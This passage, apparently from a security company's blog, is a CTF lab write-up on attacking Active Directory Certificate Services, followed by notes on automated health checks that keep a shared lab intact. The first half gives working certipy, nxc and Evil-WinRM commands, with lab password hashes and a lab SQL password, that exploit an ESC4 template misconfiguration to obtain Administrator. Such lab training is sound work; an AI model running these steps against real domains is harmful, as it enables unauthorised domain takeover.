+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ evil-winrm -i dc02.backward.rv -u 'Administrator' -H 'd0e0677333c1c1e80a537d580b158509'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cat C:\Users\Administrator\Desktop\flag8.txt
+RV{adCs_1$_!NcreD!8Ly_DAN93ROu$_b9d9130b50d9cbcf8d9250c2c8e61385}
+</code></pre></div></div>
+
+<h2 id="path-2-esc4">Path 2: ESC4</h2>
+
+<p>The <code class="language-plaintext highlighter-rouge">BackwardDev</code> template is another custom template that was created in this environment. It has the <code class="language-plaintext highlighter-rouge">Client Authentication</code> purpose, and the <code class="language-plaintext highlighter-rouge">iqbal.hassan</code> user is allowed to enroll for it:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy find -u 'iqbal.hassan' -hashes ':dfd368bc95bd217c04415fed81c8933e' -dc-host 'dc02.backward.rv' -stdout -enabled | grep 'BackwardDev' -A 60
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+    Template Name                       : BackwardDev
+    Display Name                        : Backward Dev
+    Certificate Authorities             : BACKWARD-ENTERPRISE-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+    Certificate Name Flag               : SubjectAltRequireUpn
+                                          SubjectRequireEmail
+                                          SubjectRequireDirectoryPath
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PendAllRequests
+                                          PublishToDs
+                                          AutoEnrollment
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Code Signing
+    Requires Manager Approval           : True
+    Requires Key Archival               : False
+    RA Application Policies             : Any Purpose
+    Authorized Signatures Required      : 1
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Template Created                    : 2025-08-30T08:43:45+00:00
+    Template Last Modified              : 2025-08-30T08:43:47+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : BACKWARD.RV\CA-Test
+      Object Control Permissions
+        Owner                           : BACKWARD.RV\Enterprise Admins
+        Full Control Principals         : BACKWARD.RV\CA-Test
+                                          BACKWARD.RV\Domain Admins
+                                          BACKWARD.RV\Local System
+                                          BACKWARD.RV\Enterprise Admins
+        Write Owner Principals          : BACKWARD.RV\CA-Test
+                                          BACKWARD.RV\Domain Admins
+                                          BACKWARD.RV\Local System
+                                          BACKWARD.RV\Enterprise Admins
+        Write Dacl Principals           : BACKWARD.RV\CA-Test
+                                          BACKWARD.RV\Domain Admins
+                                          BACKWARD.RV\Local System
+                                          BACKWARD.RV\Enterprise Admins
+        Write Property Enroll           : BACKWARD.RV\CA-Test
+
+</code></pre></div></div>
+
+<p>We’ll find that, unlike <code class="language-plaintext highlighter-rouge">BackwardUser</code>, this template does <strong>not</strong> have the <code class="language-plaintext highlighter-rouge">Enrollee Supplies Subject</code> property set to <code class="language-plaintext highlighter-rouge">True</code>. We also notice that the <code class="language-plaintext highlighter-rouge">BACKWARD.RV\CA-Test</code> group is a non-default group that has been granted enrollment rights, and <strong>Full Control</strong> on the template.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">iqbal.hassan</code> user is a member of the <code class="language-plaintext highlighter-rouge">CA-Test</code> group, which grants him full control over the <code class="language-plaintext highlighter-rouge">BackwardDev</code> template.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'iqbal.hassan' -H 'dfd368bc95bd217c04415fed81c8933e' -M whoami                                                                                                   
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:backward.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] backward.rv\iqbal.hassan:dfd368bc95bd217c04415fed81c8933e 
+WHOAMI      10.5.10.12      389    DC02             Name: Iqbal Hassan
+WHOAMI      10.5.10.12      389    DC02             sAMAccountName: iqbal.hassan
+WHOAMI      10.5.10.12      389    DC02             Enabled: Yes
+WHOAMI      10.5.10.12      389    DC02             Password Never Expires: No
+WHOAMI      10.5.10.12      389    DC02             Last logon: 2025-09-08 15:38:32 UTC
+WHOAMI      10.5.10.12      389    DC02             Password Last Set: 2025-08-28 19:17:07 UTC
+WHOAMI      10.5.10.12      389    DC02             Bad Password Count: 0
+WHOAMI      10.5.10.12      389    DC02             Distinguished Name: CN=Iqbal Hassan,CN=Users,DC=backward,DC=rv
+WHOAMI      10.5.10.12      389    DC02             Member of: CN=CA-Test,CN=Users,DC=backward,DC=rv
+WHOAMI      10.5.10.12      389    DC02             User SID: S-1-5-21-2163652167-2436585246-2491459670-1109
+</code></pre></div></div>
+
+<h3 id="abusing-full-control">Abusing Full Control</h3>
+
+<p>With full control over the <code class="language-plaintext highlighter-rouge">BackwardDev</code> template, we can modify its properties. One of the properties we can change is the <code class="language-plaintext highlighter-rouge">Enrollee Supplies Subject</code> property, which we can set to <code class="language-plaintext highlighter-rouge">True</code>. This will make the <code class="language-plaintext highlighter-rouge">BackwardDev</code> template behave similarly to the <code class="language-plaintext highlighter-rouge">BackwardUser</code> template, thereby being vulnerable to <code class="language-plaintext highlighter-rouge">ESC1</code>.</p>
+
+<p>We can use <code class="language-plaintext highlighter-rouge">certipy</code> to modify the template, and keep a copy of the original template in case we need to revert the changes later. The <code class="language-plaintext highlighter-rouge">-write-default-configuration</code> flag can be used to apply an <code class="language-plaintext highlighter-rouge">ESC1</code> configuration to the template:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy template --help
+[...snip...]
+  -write-default-configuration
+                        Apply the default Certipy ESC1 configuration to the certificate template. This configures the template to be vulnerable to ESC1 attack.
+[...snip...]
+</code></pre></div></div>
+
+<p>Now, we can apply the <code class="language-plaintext highlighter-rouge">ESC1</code> configuration to the <code class="language-plaintext highlighter-rouge">BackwardDev</code> template:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy template -u 'iqbal.hassan' -hashes ':dfd368bc95bd217c04415fed81c8933e' -dc-host 'dc02.backward.rv' -template 'BackwardDev' -write-default-configuration 
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: dc02.backward.rv.
+[!] Use -debug to print a stacktrace
+[*] Saving current configuration to 'BackwardDev.json'
+[*] Wrote current configuration for 'BackwardDev' to 'BackwardDev.json'
+[*] Updating certificate template 'BackwardDev'
+[*] Deleting:
+[*]     msPKI-RA-Application-Policies: []
+[*] Replacing:
+[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
+[*]     flags: 66104
+[*]     pKIDefaultKeySpec: 2
+[*]     pKIKeyUsage: b'\x86\x00'
+[*]     pKIMaxIssuingDepth: -1
+[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
+[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
+[*]     msPKI-RA-Signature: 0
+[*]     msPKI-Enrollment-Flag: 0
+[*]     msPKI-Private-Key-Flag: 16
+[*]     msPKI-Certificate-Name-Flag: 1
+[*]     msPKI-Minimal-Key-Size: 2048
+[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
+Are you sure you want to apply these changes to 'BackwardDev'? (y/N): y
+[*] Successfully updated 'BackwardDev'
+</code></pre></div></div>
+
+<p>We can verify that the <code class="language-plaintext highlighter-rouge">Enrollee Supplies Subject</code> property has been set to <code class="language-plaintext highlighter-rouge">True</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy find -u 'iqbal.hassan' -hashes ':dfd368bc95bd217c04415fed81c8933e' -dc-host 'dc02.backward.rv' -stdout -enabled | grep 'BackwardDev' -A 20
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+    Template Name                       : BackwardDev
+    Display Name                        : Backward Dev
+    Certificate Authorities             : BACKWARD-ENTERPRISE-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+</code></pre></div></div>
+
+<p>Just like we did with <code class="language-plaintext highlighter-rouge">BackwardUser</code>, we can now request a certificate for the <code class="language-plaintext highlighter-rouge">iqbal.hassan</code> user, but artificially setting the <code class="language-plaintext highlighter-rouge">userPrincipalName (UPN)</code> to  <code class="language-plaintext highlighter-rouge">Administrator@backward.rv</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy req -u 'iqbal.hassan' -hashes ':dfd368bc95bd217c04415fed81c8933e' -dc-host 'dc02.backward.rv' -ca 'BACKWARD-ENTERPRISE-CA' -upn 'Administrator@backward.rv' -template 'BackwardDev'  
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: dc02.backward.rv.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 12
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@backward.rv'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+</code></pre></div></div>
+
+<p>We can then use this <code class="language-plaintext highlighter-rouge">PFX</code> file to authenticate to <code class="language-plaintext highlighter-rouge">LDAP</code> as <code class="language-plaintext highlighter-rouge">Administrator</code>, from which we can do exactly what we did in <a href="#path-1-esc1">Path 1: ESC1</a> to get the final flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ nxc ldap dc02.backward.rv -u 'Administrator' --pfx-cert administrator.pfx
+LDAP        10.5.10.12      389    DC02             [*] Windows Server 2022 Build 20348 (name:DC02) (domain:backward.rv) (signing:None) (channel binding:Never) 
+LDAP        10.5.10.12      389    DC02             [+] backward.rv\Administrator:d0e0677333c1c1e80a537d580b158509 (Pwn3d!)
+</code></pre></div></div>
+
+<h3 id="cleanup">Cleanup</h3>
+
+<p>As we have modified the <code class="language-plaintext highlighter-rouge">BackwardDev</code> template, it is good practice to revert the changes to avoid leaving the environment in a vulnerable state. We can use the saved configuration file <code class="language-plaintext highlighter-rouge">BackwardDev.json</code> to restore the original settings of the template:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy template -u 'iqbal.hassan' -hashes ':dfd368bc95bd217c04415fed81c8933e' -dc-host 'dc02.backward.rv' -template 'BackwardDev' -write-configuration BackwardDev.json                    
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: dc02.backward.rv.
+[!] Use -debug to print a stacktrace
+[*] Saving current configuration to 'BackwardDev.json'
+File 'BackwardDev.json' already exists. Overwrite? (y/n - saying no will save with a unique filename): n
+[*] Wrote current configuration for 'BackwardDev' to 'BackwardDev_ffca128e-e91d-4e24-bbfd-6ecfcb17a869.json'
+[*] Updating certificate template 'BackwardDev'
+[*] Adding:
+[*]     msPKI-RA-Application-Policies: ['2.5.29.37.0']
+[*] Replacing:
+[*]     nTSecurityDescriptor: b'\x01\x00\x04\x8c\x0c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x04\x00\xf8\x00\x07\x00\x00\x00\x05\x008\x00\x00\x01\x00\x00\x01\x00\x00\x00h\xc9\x10\x0e\xfbx\xd2\x11\x90\xd4\x00\xc0Oy\xdcU\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00G\xb6\xf6\x80\x1eW;\x91V\xa8\x80\x94D\x06\x00\x00\x00\x00$\x00\xff\x01\x0f\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00G\xb6\xf6\x80\x1eW;\x91V\xa8\x80\x94\x00\x02\x00\x00\x00\x00$\x00\xff\x01\x0f\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00G\xb6\xf6\x80\x1eW;\x91V\xa8\x80\x94D\x06\x00\x00\x00\x00\x14\x00\x94\x00\x02\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x12\x00\x00\x00\x00\x12$\x00\xff\x01\x0f\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00G\xb6\xf6\x80\x1eW;\x91V\xa8\x80\x94\x07\x02\x00\x00\x00\x12$\x00\xbd\x01\x0f\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00G\xb6\xf6\x80\x1eW;\x91V\xa8\x80\x94\x00\x02\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00G\xb6\xf6\x80\x1eW;\x91V\xa8\x80\x94\x07\x02\x00\x00'
+[*]     flags: 131642
+[*]     pKIDefaultKeySpec: 1
+[*]     pKIKeyUsage: b'\xa0\x00'
+[*]     pKIMaxIssuingDepth: 0
+[*]     pKICriticalExtensions: ['2.5.29.15']
+[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.3']
+[*]     msPKI-RA-Signature: 1
+[*]     msPKI-Enrollment-Flag: 43
+[*]     msPKI-Private-Key-Flag: 16842768
+[*]     msPKI-Certificate-Name-Flag: -1577058304
+[*]     msPKI-Minimal-Key-Size: 4096
+[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.3']
+Are you sure you want to apply these changes to 'BackwardDev'? (y/N): y
+[*] Successfully updated 'BackwardDev'
+</code></pre></div></div>
+
+<p>We can verify that the <code class="language-plaintext highlighter-rouge">Enrollee Supplies Subject</code> property has been reverted to <code class="language-plaintext highlighter-rouge">False</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~$ certipy find -u 'iqbal.hassan' -hashes ':dfd368bc95bd217c04415fed81c8933e' -dc-host 'dc02.backward.rv' -stdout -enabled | grep 'BackwardDev' -A 20
+
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+    Template Name                       : BackwardDev
+    Display Name                        : Backward Dev
+    Certificate Authorities             : BACKWARD-ENTERPRISE-CA
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : False
+</code></pre></div></div>
+
+<h1 id="behind-the-scenes">Behind the Scenes</h1>
+
+<p>In the 2 previous conferences that we sponsored this year, we presented similar ranges: <a href="https://blog.async.sg/sincon-2025-adcs-relay.html">SINCON 2025</a>, and <a href="https://blog.async.sg/offbyone-2025.html">Off-By-One 2025</a>. In both of these conferences, we mainly focused on ensuring that the labs had the necessary guardrails to ensure that unintended solutions were not possible.</p>
+
+<h2 id="a-common-theme">A Common Theme</h2>
+
+<p>The effort was not in vain, as we observed that the majority of participants followed the intended paths. However, we did notice that a few participants were piggybacking off other participants’ solutions, which led to some confusion. This is a common occurrence in Capture The Flag (CTF) events, where participants share the same network environment - referred to as “griefing”.</p>
+
+<p>There are a number of ways that participants can piggyback off each other, such as:</p>
+
+<ol>
+  <li>Adding common compromised users to privileged groups</li>
+  <li>Modifying <code class="language-plaintext highlighter-rouge">ADCS</code> templates, without reverting the changes</li>
+  <li>Tbh, too many more to list here…</li>
+</ol>
+
+<p>This is not an easy problem to solve, especially in a live event where participants are actively trying to break into the environment. Instead of focusing on preventing unintended solutions, we placed a heavy emphasis on preventing these disruptions this time around.</p>
+
+<h2 id="environment-checking">Environment Checking</h2>
+
+<p>A path that participants may have tried, was to <a href="#abusing-genericall-on-group">add the <code class="language-plaintext highlighter-rouge">jolene.ong</code> user to the <code class="language-plaintext highlighter-rouge">Senior Developers</code> group</a> rather than creating a new user. This would have essentially “broken” the intended path, as the next participant would no longer have to abuse this <code class="language-plaintext highlighter-rouge">GenericAll</code> ACE.</p>
+
+<p>In a fixed environment, it is trivial to identify the “default” users present in the environment. For example, in <code class="language-plaintext highlighter-rouge">antennae.rv</code>, we know that the <code class="language-plaintext highlighter-rouge">Senior Developers</code> group initially only contains 2 members. And as such, we can continually monitor the membership of this group, and remove any unexpected members.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">healthcheck</span>
+<span class="k">def</span> <span class="nf">check_group_mem_senior_developers</span><span class="p">(</span><span class="n">ctx</span><span class="p">:</span> <span class="n">Context</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="s">"TestResult"</span><span class="p">:</span>
+    <span class="n">ctx</span><span class="p">.</span><span class="n">logger</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Checking group membership for senior-developers..."</span><span class="p">)</span>
+    <span class="n">config</span> <span class="o">=</span> <span class="n">ctx</span><span class="p">.</span><span class="n">config</span>
+    <span class="n">cred</span> <span class="o">=</span> <span class="n">config</span><span class="p">.</span><span class="n">get_credential</span><span class="p">(</span><span class="s">"antennae_da"</span><span class="p">)</span>
+
+    <span class="n">members</span> <span class="o">=</span> <span class="n">ad</span><span class="p">.</span><span class="n">get_group_membership</span><span class="p">(</span>
+        <span class="n">cfg</span><span class="o">=</span><span class="n">config</span><span class="p">,</span>
+        <span class="n">group_name</span><span class="o">=</span><span class="s">"Senior Developers"</span><span class="p">,</span>
+        <span class="n">dc_hostname</span><span class="o">=</span><span class="s">"dc01"</span><span class="p">,</span>
+        <span class="n">identifier</span><span class="o">=</span><span class="n">cred</span><span class="p">.</span><span class="nb">id</span><span class="p">,</span>
+    <span class="p">)</span>
+
+    <span class="n">original_members</span> <span class="o">=</span> <span class="p">[</span>
+        <span class="s">"wei.jie.tan"</span><span class="p">,</span>
+        <span class="s">"danish.hakim"</span><span class="p">,</span>
+    <span class="p">]</span>
+
+    <span class="n">disruptive_members</span> <span class="o">=</span> <span class="p">[</span><span class="n">m</span> <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">members</span> <span class="k">if</span> <span class="n">m</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">original_members</span><span class="p">]</span>
+    <span class="c1"># more filtering can be done here, such as ignoring users that are known to be created by participants
+</span>    <span class="c1"># e.g. disruptive_members = [m for m in disruptive_members if not m.startswith("rvctf2025-")]
+</span>
+    <span class="k">if</span> <span class="n">disruptive_members</span><span class="p">:</span>
+      <span class="n">ctx</span><span class="p">.</span><span class="n">logger</span><span class="p">.</span><span class="n">warning</span><span class="p">(</span><span class="sa">f</span><span class="s">"Disruptive members found in senior-developers: </span><span class="si">{</span><span class="s">', '</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">disruptive_members</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+      <span class="n">cmd</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""
+$group = "senior-developers"
+$members = @(</span><span class="si">{</span><span class="s">', '</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s">'"</span><span class="si">{</span><span class="n">m</span><span class="si">}</span><span class="s">"' for m in disruptive_members])</span><span class="si">}</span><span class="s">)
+foreach ($member in $members) 
+      """</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+      <span class="n">output</span> <span class="o">=</span> <span class="n">execute_command_winrm</span><span class="p">(</span>
+          <span class="n">server</span><span class="o">=</span><span class="s">"dc01.antennae.rv"</span><span class="p">,</span>
+          <span class="n">username</span><span class="o">=</span><span class="n">cred</span><span class="p">.</span><span class="n">username</span><span class="p">,</span>
+          <span class="n">password</span><span class="o">=</span><span class="n">cred</span><span class="p">.</span><span class="n">password</span><span class="p">,</span>
+          <span class="n">command</span><span class="o">=</span><span class="n">cmd</span>
+      <span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+    
+    <span class="c1"># do more stuff...
+</span></code></pre></div></div>
+
+<p>Of course, this can be extended to monitor anything else that is relevant to the environment - for example, ensuring that essential files are not modified, such that the next participant can still complete the challenge.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">@</span><span class="n">healthcheck</span>
+<span class="k">def</span> <span class="nf">check_wjt_ps_history</span><span class="p">(</span><span class="n">ctx</span><span class="p">:</span> <span class="n">Context</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="s">"TestResult"</span><span class="p">:</span>
+    <span class="n">config</span> <span class="o">=</span> <span class="n">ctx</span><span class="p">.</span><span class="n">config</span>
+    <span class="n">cred</span> <span class="o">=</span> <span class="n">config</span><span class="p">.</span><span class="n">get_credential</span><span class="p">(</span><span class="s">"wei.jie.tan"</span><span class="p">)</span>
+    
+    <span class="n">output</span> <span class="o">=</span> <span class="n">execute_command_ssh</span><span class="p">(</span>
+        <span class="n">server</span><span class="o">=</span><span class="s">"sql01.antennae.rv"</span><span class="p">,</span>
+        <span class="n">username</span><span class="o">=</span><span class="n">cred</span><span class="p">.</span><span class="n">username</span><span class="p">,</span>
+        <span class="n">password</span><span class="o">=</span><span class="n">cred</span><span class="p">.</span><span class="n">password</span><span class="p">,</span>
+        <span class="n">command</span><span class="o">=</span><span class="s">"Get-Content (Get-PSReadlineOption).HistorySavePath"</span>
+    <span class="p">).</span><span class="n">strip</span><span class="p">()</span>
+
+    <span class="n">expected</span> <span class="o">=</span> <span class="sa">r</span><span class="s">"""
+sqlcmd -S localhost -U "svc_sql" -P "P@ssw0rd_f0r_SQL-antennae" -Q "EXEC sp_helpdb;"
+"""</span>
+    <span class="k">if</span> <span class="n">expected</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">output</span><span class="p">:</span>
+      <span class="c1"># uh oh, the challenge is not solvable anymore!
+</span>      <span class="c1"># do stuff... maybe revert the changes?
+</span></code></pre></div></div>
+
+<p>Automating these checks can help to ensure that the environment remains in a consistent state, and that participants can complete the challenges as intended. Additionally, when handling these events in person, it’s not easy to monitor the environment manually, especially when there are many participants. Automating these checks can help to reduce the workload on the event organizers, allowing them to focus on other aspects of the event.</p>
+
+<blockquote>
+  <p>Many of these engineering efforts were done when designing the <a href="https://shop.async.sg/collections/w200-introduction-to-active-directory-penetration-testing">W200</a> course, to ensure that the labs remain in a consistent state. Additionally, should any learner accidentally break the lab, we can monitor and revert the changes automatically, ensuring uptime even during weekends or non-working hours,</p>
+</blockquote>
+
+<h2 id="ldap-modifications">LDAP Modifications</h2>
+
+<p>Another measure that can be done is taking a snapshot of the current <code class="language-plaintext highlighter-rouge">LDAP</code> state, and periodically checking for any changes and reverting them back. An example is the following snippet from our internal libraries that can used to monitor these changes</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">compare_snapshots</span><span class="p">(</span>
+    <span class="bp">self</span><span class="p">,</span> <span class="n">current_snapshot</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Any</span><span class="p">]]</span>
+<span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="n">LDAPChange</span><span class="p">]:</span>
+    <span class="n">changes</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">timestamp</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">.</span><span class="n">now</span><span class="p">()</span>
+
+    <span class="c1"># [...snip...]
+</span>
+    <span class="n">current_attrs</span> <span class="o">=</span> <span class="n">current_snapshot</span><span class="p">[</span><span class="n">dn</span><span class="p">]</span>
+    <span class="n">all_attrs</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">baseline_attrs</span><span class="p">.</span><span class="n">keys</span><span class="p">())</span> <span class="o">|</span> <span class="nb">set</span><span class="p">(</span><span class="n">current_attrs</span><span class="p">.</span><span class="n">keys</span><span class="p">())</span>
+
+    <span class="k">for</span> <span class="n">attr</span> <span class="ow">in</span> <span class="n">all_attrs</span><span class="p">:</span>
+        <span class="n">baseline_value</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">baseline_attrs</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">attr</span><span class="p">)</span>
+        <span class="n">current_value</span> <span class="o">=</span> <span class="n">current_attrs</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">attr</span><span class="p">)</span>
+
+        <span class="c1"># handle modifications in `member` attributes
+</span>        <span class="k">if</span> <span class="n">attr</span> <span class="o">==</span> <span class="s">"member"</span><span class="p">:</span>
+            <span class="n">baseline_members</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">baseline_value</span><span class="p">)</span> <span class="k">if</span> <span class="n">baseline_value</span> <span class="k">else</span> <span class="nb">set</span><span class="p">()</span>
+            <span class="n">current_members</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">current_value</span><span class="p">)</span> <span class="k">if</span> <span class="n">current_value</span> <span class="k">else</span> <span class="nb">set</span><span class="p">()</span>
+
+            <span class="n">added_members</span> <span class="o">=</span> <span class="n">current_members</span> <span class="o">-</span> <span class="n">baseline_members</span>
+            <span class="n">removed_members</span> <span class="o">=</span> <span class="n">baseline_members</span> <span class="o">-</span> <span class="n">current_members</span>
+
+            <span class="c1"># someone added members to a group
+</span>            <span class="k">for</span> <span class="n">member</span> <span class="ow">in</span> <span class="n">added_members</span><span class="p">:</span>
+                <span class="n">changes</span><span class="p">.</span><span class="n">append</span><span class="p">(</span>
+                    <span class="n">LDAPChange</span><span class="p">(</span>
+                        <span class="n">change_type</span><span class="o">=</span><span class="n">ChangeType</span><span class="p">.</span><span class="n">MEMBER_ADDED</span><span class="p">,</span>
+                        <span class="n">dn</span><span class="o">=</span><span class="n">dn</span><span class="p">,</span>
+                        <span class="n">attribute</span><span class="o">=</span><span class="s">"member"</span><span class="p">,</span>
+                        <span class="n">old_value</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span>
+                        <span class="n">new_value</span><span class="o">=</span><span class="n">member</span><span class="p">,</span>
+                        <span class="n">timestamp</span><span class="o">=</span><span class="n">timestamp</span><span class="p">,</span>
+                    <span class="p">)</span>
+                <span class="p">)</span>
+</code></pre></div></div>
+
+<p>This can be manually extended to monitor for all other attributes that are relevant to the environment, such as the <code class="language-plaintext highlighter-rouge">userAccountControl</code>, <code class="language-plaintext highlighter-rouge">msDS-AllowedToDelegateTo</code>, etc.</p>
+
+<h1 id="summary">Summary</h1>
+
+<p>Overall, we found that the event was a great success, with many participants enjoying the challenges and learning new skills. Partnering with <a href="https://www.linkedin.com/company/the-range-village/">The Range Village</a> once again was a pleasure, and we’re more than happy to help out with communiy-driven events like these.</p>
 
 
 <script>
